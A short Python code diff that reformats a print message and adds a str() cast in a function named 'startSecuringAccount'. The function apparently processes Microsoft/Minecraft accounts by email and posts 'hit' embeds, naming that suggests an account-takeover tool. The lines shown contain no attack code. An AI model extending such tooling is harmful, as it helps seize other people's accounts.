@@ -28,7 +28,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
 
     initialTime = time.time()
     if msaauth == "Family":
-        print(f"Account is Family Locked    ")
+        print(f"[X] - Account is Family Locked")
         for i in ["name", "email", "security_email"]:
             account[i] = "Child Locked"
     else:
@@ -63,7 +63,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     
     if account["method"] != "No Minecraft":
         mcEmbed = Embed()        
-        hitEmbed.set_thumbnail(url=f"https://mc-heads.net/avatar/{account['name']}/128")
+        hitEmbed.set_thumbnail(url=f"https://mc-heads.net/avatar/{str(account['name'])}/128")
 
     accountData = {
         "hit_embed": hitEmbed,
